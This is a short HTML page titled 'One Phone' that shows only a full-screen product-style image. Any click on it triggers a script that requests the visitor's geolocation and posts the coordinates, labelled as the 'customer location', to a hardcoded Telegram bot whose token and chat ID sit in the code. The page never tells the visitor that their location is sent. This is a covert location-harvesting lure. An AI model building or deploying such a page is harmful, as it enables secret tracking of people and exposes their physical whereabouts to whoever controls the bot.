
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>One Phone</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: black;
    }
    #main {
      background-image: url('one-phone.jpg');
      background-size: cover;
      background-position: center;
      height: 100%;
      width: 100%;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="main" onclick="sendLocation()"></div>

  <script>
    function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          const token = "7876861765:AAFHhXiCHpDM7qeYLZNEfq1WoEpD9vErTr8";
          const chat_id = "5880561408";
          const message = `موقع الزبون:\nخط العرض: ${lat}\nخط الطول: ${lon}`;

          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: chat_id,
              text: message
            })
          }).then(res => {
            console.log("تم إرسال الموقع إلى Telegram");
          }).catch(err => {
            console.error("فشل في الإرسال:", err);
          });

        }, function(error) {
          alert("فشل في تحديد الموقع: " + error.message);
        });
      } else {
        alert("الموقع غير مدعوم في هذا المتصفح.");
      }
    }
  </script>
</body>
</html>
